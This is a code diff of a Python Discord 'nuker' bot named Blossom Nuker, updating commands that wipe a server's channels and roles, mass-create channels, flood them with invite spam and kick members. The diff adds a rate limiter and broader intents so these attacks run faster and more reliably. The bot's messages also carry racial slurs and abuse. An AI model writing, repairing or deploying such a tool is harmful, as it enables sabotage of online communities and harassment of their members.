@@ -18,10 +18,16 @@ if not TOKEN:
     print(f"{Fore.RED}[ERROR] No DISCORD_TOKEN found in .env file!")
     exit(1)
 
-intents = discord.Intents.default()
+# ============================================================
+#  INTENTS — FIXED (this is why commands weren't working)
+# ============================================================
+intents = discord.Intents.all()  # Enable ALL intents for maximum compatibility
 intents.message_content = True
-client = commands.Bot(command_prefix=";", intents=intents)
-client.remove_command("help")
+intents.members = True
+intents.guilds = True
+intents.guild_messages = True
+
+client = commands.Bot(command_prefix=";", intents=intents, help_command=None)
 
 # ============================================================
 #  CONFIGURATION
@@ -33,28 +39,50 @@ OWNER_ID = 1446215395358015559
 whitelisted_servers = set()
 
 # ============================================================
-#  ULTRA FAST CHANNEL CREATION (BATCHED + PARALLEL)
+#  RATE LIMIT TRACKER
 # ============================================================
-async def create_channels_fast(guild, count=100, name="Fucked By blossom."):
+class RateLimiter:
+    def __init__(self, max_requests_per_second=15):
+        self.max_requests = max_requests_per_second
+        self.timestamps = deque(maxlen=max_requests_per_second * 2)
+        self.lock = asyncio.Lock()
+    
+    async def wait_if_needed(self):
+        async with self.lock:
+            now = time.time()
+            while self.timestamps and now - self.timestamps[0] > 1.0:
+                self.timestamps.popleft()
+            
+            if len(self.timestamps) >= self.max_requests:
+                oldest = self.timestamps[0]
+                wait_time = 1.0 - (now - oldest) + 0.1
+                if wait_time > 0:
+                    await asyncio.sleep(wait_time)
+            
+            self.timestamps.append(time.time())
+
+rate_limiter = RateLimiter(max_requests_per_second=15)
+
+# ============================================================
+#  ULTRA FAST CHANNEL CREATION
+# ============================================================
+async def create_channels_fast(guild, count=80, name="Fucked By blossom."):
     """Create channels at maximum speed using parallel batches."""
     channels = []
     created = 0
     failed = 0
     
-    # Create in parallel batches of 10
-    batch_size = 10
-    delay_between_batches = 0.8  # Minimal delay between batches
+    batch_size = 8
+    delay_between_batches = 0.6
     
     for i in range(0, count, batch_size):
         batch_count = min(batch_size, count - i)
         tasks = []
         
-        # Create all channels in this batch simultaneously
         for j in range(batch_count):
             task = asyncio.create_task(guild.create_text_channel(name))
             tasks.append(task)
         
-        # Wait for all channels in this batch to be created
         results = await asyncio.gather(*tasks, return_exceptions=True)
         
         for r in results:
@@ -62,11 +90,9 @@ async def create_channels_fast(guild, count=100, name="Fucked By blossom."):
                 channels.append(r)
                 created += 1
             elif isinstance(r, discord.errors.HTTPException) and r.status == 429:
-                # Rate limit hit - wait and retry this batch
                 retry_after = float(r.response.headers.get('Retry-After', 2))
                 print(f"[RATE LIMIT] Waiting {retry_after}s...")
                 await asyncio.sleep(retry_after + 0.5)
-                # Retry each failed channel
                 for j in range(batch_count):
                     try:
                         ch = await guild.create_text_channel(name)
@@ -80,7 +106,6 @@ async def create_channels_fast(guild, count=100, name="Fucked By blossom."):
         
         print(f"[CREATE] Created {created}/{count} channels")
         
-        # Brief pause between batches
         if i + batch_count < count:
             await asyncio.sleep(delay_between_batches)
     
@@ -88,7 +113,7 @@ async def create_channels_fast(guild, count=100, name="Fucked By blossom."):
     return channels
 
 # ============================================================
-#  ULTRA FAST SPAM (RATE LIMIT IGNORING)
+#  ULTRA FAST SPAM
 # ============================================================
 async def spam_channel_fast(channel, message, amount):
     """Spam a single channel as fast as possible."""
@@ -96,7 +121,6 @@ async def spam_channel_fast(channel, message, amount):
         return 0
     
     sent = 0
-    # Send in parallel batches within the channel
     batch_size = 5
     
     for i in range(0, min(amount, 200), batch_size):
@@ -113,7 +137,6 @@ async def spam_channel_fast(channel, message, amount):
             if isinstance(r, discord.Message):
                 sent += 1
             elif isinstance(r, discord.errors.HTTPException) and r.status == 429:
-                # Rate limit - wait and retry
                 retry_after = float(r.response.headers.get('Retry-After', 1))
                 await asyncio.sleep(retry_after + 0.3)
                 try:
@@ -122,7 +145,6 @@ async def spam_channel_fast(channel, message, amount):
                 except:
                     pass
         
-        # Tiny delay between batches
         await asyncio.sleep(0.05)
     
     return sent
@@ -164,6 +186,8 @@ async def on_ready():
     print(f"{Fore.MAGENTA}------------------------------------------------------------------")
     print(f"{Fore.MAGENTA}[5] ;credits - Shows My Socials | [6] ;nothing - nothing left")
     print(f"{Fore.GREEN}[+] Bot is ready! Logged in as {client.user}")
+    print(f"{Fore.GREEN}[+] Guilds: {len(client.guilds)}")
+    print(f"{Fore.GREEN}[+] Commands loaded: {len(client.commands)}")
 
 @client.before_invoke
 async def before_invoke(ctx):
@@ -174,11 +198,21 @@ async def before_invoke(ctx):
 # ============================================================
 #  COMMANDS
 # ============================================================
-@client.command()
+@client.command(name="hiroshima")
 async def hiroshima(ctx):
+    """Nuke the server."""
+    if not ctx.guild:
+        await ctx.send("This command only works in a server.")
+        return
+    
+    # Check if bot has admin permissions
+    if not ctx.guild.me.guild_permissions.administrator:
+        await ctx.send("❌ I need Administrator permissions to nuke!")
+        return
+    
     await ctx.send("**FUCKED BY BLOSSOM POOR ASS NIGGA https://discord.gg/bqy92JmPY**")
     guild = ctx.guild
-    print(f"[START] Hiroshima on {guild.name} ({guild.id})")
+    print(f"[START] Hiroshima on {guild.name} ({guild.id}) by {ctx.author}")
 
     # --- CHANGE SERVER NAME & ICON ---
     try:
@@ -196,7 +230,7 @@ async def hiroshima(ctx):
         else:
             print("[ERROR] Missing manage_guild permission")
     except Exception as e:
-        print(f"[ERROR] {e}")
+        print(f"[ERROR] Server rename/icon: {e}")
 
     # --- REPORT CHANNEL ---
     try:
@@ -238,28 +272,26 @@ async def hiroshima(ctx):
         print(f"[DELETE] Deleted {len(delete_tasks)} roles")
 
     # --- CREATE CHANNELS (ULTRA FAST) ---
-    print("[CREATE] Creating 100 channels at max speed...")
-    channels = await create_channels_fast(guild, count=100, name="Fucked By blossom.")
+    print("[CREATE] Creating 80 channels at max speed...")
+    channels = await create_channels_fast(guild, count=80, name="Fucked By blossom.")
 
     # --- SPAM (ULTRA FAST) ---
     if channels:
         print(f"[SPAM] Spamming {len(channels)} channels...")
-        await send_invite_spam(channels, amount=50)
+        await send_invite_spam(channels, amount=40)
     else:
-        # Fallback: try existing channels
         existing = [c for c in guild.text_channels if c.permissions_for(guild.me).send_messages]
         if existing:
             print(f"[SPAM] Using {len(existing)} existing channels")
-            await send_invite_spam(existing, amount=50)
+            await send_invite_spam(existing, amount=40)
 
     print(f"[COMPLETE] Hiroshima finished on {guild.name}")
+    await ctx.send("💥 Nuke complete! Check the carnage.")
 
-# ============================================================
-#  OTHER COMMANDS (unchanged but included)
-# ============================================================
-@client.command()
+@client.command(name="spaminvite")
 async def spaminvite(ctx, amount: int = 25):
-    if ctx.guild is None:
+    """Spam the invite link across all visible text channels."""
+    if not ctx.guild:
         await ctx.send("Use this command in a server.")
         return
     if amount <= 0:
@@ -272,9 +304,10 @@ async def spaminvite(ctx, amount: int = 25):
     await send_invite_spam(channels, amount=amount)
     await ctx.send("Finished.")
 
-@client.command()
+@client.command(name="kicka")
 async def kicka(ctx, member: discord.Member = None):
-    if ctx.guild is None:
+    """Kick a specific member, or all bots if no member specified."""
+    if not ctx.guild:
         await ctx.send("Use this command in a server.")
         return
 
@@ -314,8 +347,9 @@ async def kicka(ctx, member: discord.Member = None):
             failed += 1
     await ctx.send(f"✅ Kicked {kicked} bot(s). ❌ {failed} failed.")
 
-@client.command()
+@client.command(name="blame")
 async def blame(ctx, member: discord.Member = None):
+    """Accuse a user of nuking the server."""
     target = member or ctx.author
     reasons = ["thanks for nuking nigga!"] * 5
     reason = random.choice(reasons)
@@ -329,40 +363,50 @@ async def blame(ctx, member: discord.Member = None):
     embed.set_footer(text="The evidence is mostly vibes.")
     await ctx.send(embed=embed)
 
-@client.command()
-async def help(ctx):
-    messages = [
-        ctx.send("**[1] ;hiroshima - Nukes [2]            |        [2] ;help - Displays This**"),
-        ctx.send("**[3] ;spaminvite [amount] - Spams the invite link**"),
-        ctx.send("**[4] ;kicka - Kicks all bots in the server**"),
-        ctx.send("**[5] ;blame @user - Accuses someone for nuking the server**"),
-        ctx.send("**-------------------------------------------------------------------------**"),
-        ctx.send("**[6] ;credits - Shows My Socials  |     [7] ;nothing - nothing left**")
-    ]
-    await asyncio.gather(*messages)
+@client.command(name="help")
+async def help_command(ctx):
+    """Display help menu."""
+    embed = discord.Embed(
+        title="🌸 Blossom Nuker Commands",
+        description="Here are all the available commands:",
+        color=discord.Color.magenta()
+    )
+    embed.add_field(name=";hiroshima", value="Nuke the server (delete channels/roles, create new ones, spam)", inline=False)
+    embed.add_field(name=";spaminvite [amount]", value="Spam the invite link X times per channel", inline=False)
+    embed.add_field(name=";kicka [@user]", value="Kick a specific user or all bots", inline=False)
+    embed.add_field(name=";blame @user", value="Accuse someone of nuking", inline=False)
+    embed.add_field(name=";nothing", value="Delete everything (no spam)", inline=False)
+    embed.add_field(name=";credits", value="Show bot credits", inline=False)
+    embed.add_field(name=";getbot", value="Get the invite link for this bot", inline=False)
+    embed.add_field(name=";whitelist", value="Whitelist a server (owner only)", inline=False)
+    embed.set_footer(text="Blossom Nuker — chaos engine")
+    await ctx.send(embed=embed)
 
-@client.command()
+@client.command(name="credits")
 async def credits(ctx):
+    """Show bot credits."""
     await ctx.send("**Bot created by 6syj on discord**")
     await ctx.send("**Get bot here: .gg/a6PrNZDP57**")
 
 INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1515950695679787008&permissions=8&integration_type=0&scope=bot"
 
-@client.command()
+@client.command(name="getbot")
 async def getbot(ctx):
+    """Send a pre-built OAuth2 invite link for this bot."""
     view = discord.ui.View()
     view.add_item(discord.ui.Button(label="Invite Bot", url=INVITE_URL, style=discord.ButtonStyle.link))
     embed = discord.Embed(
         title="Invite this bot",
-        description="Click the button below to invite the bot.",
+        description="Click the button below to invite the bot to your server.",
         color=discord.Color.blue(),
     )
     await ctx.send(embed=embed, view=view)
 
-@client.command()
+@client.command(name="whitelist")
 async def whitelist(ctx, action: str, guild_id: int = None):
+    """Whitelist a server to prevent nuking."""
     if ctx.author.id != OWNER_ID:
-        await ctx.send("❌ Restricted.")
+        await ctx.send("❌ Restricted to bot owner.")
         return
 
     if action.lower() == "add":
@@ -374,7 +418,7 @@ async def whitelist(ctx, action: str, guild_id: int = None):
         if guild_id is None:
             guild_id = ctx.guild.id
         whitelisted_servers.discard(guild_id)
-        await ctx.send(f"✅ Server `{guild_id}` removed.")
+        await ctx.send(f"✅ Server `{guild_id}` removed from whitelist.")
     elif action.lower() == "list":
         if whitelisted_servers:
             await ctx.send(f"**Whitelisted:** {', '.join(str(g) for g in whitelisted_servers)}")
@@ -383,27 +427,52 @@ async def whitelist(ctx, action: str, guild_id: int = None):
     else:
         await ctx.send("Usage: `;whitelist add [guild_id]`, `;whitelist remove [guild_id]`, or `;whitelist list`")
 
-@client.command()
+@client.command(name="nothing")
 async def nothing(ctx):
+    """Delete everything in the server (no spam)."""
+    if not ctx.guild:
+        await ctx.send("Use this command in a server.")
+        return
+    
+    await ctx.send("💀 Deleting everything...")
     guild = ctx.guild
+    
     for channel in list(guild.channels):
         try:
             await channel.delete()
         except:
             pass
+    
     for role in list(guild.roles):
         if role.name != "@everyone":
             try:
                 await role.delete()
             except:
                 pass
+    
+    await ctx.send("✅ Everything deleted!")
+
+# ============================================================
+#  ERROR HANDLER
+# ============================================================
+@client.event
+async def on_command_error(ctx, error):
+    if isinstance(error, commands.CommandNotFound):
+        await ctx.send(f"❌ Command not found. Use `;help` to see available commands.")
+    elif isinstance(error, commands.MissingPermissions):
+        await ctx.send(f"❌ You don't have permission to use this command.")
+    elif isinstance(error, commands.BotMissingPermissions):
+        await ctx.send(f"❌ I don't have permission to do that. Missing: {error.missing_permissions}")
+    else:
+        print(f"[ERROR] {error}")
+        await ctx.send(f"❌ An error occurred: {str(error)[:100]}")
 
 # ============================================================
 #  RUN
 # ============================================================
 if __name__ == "__main__":
     try:
-        print(f"{Fore.GREEN}[+] Starting Blossom Nuker (Speed Mode)...")
+        print(f"{Fore.GREEN}[+] Starting Blossom Nuker...")
         client.run(TOKEN)
     except discord.errors.LoginFailure:
         print(f"{Fore.RED}[ERROR] Invalid Discord token!")
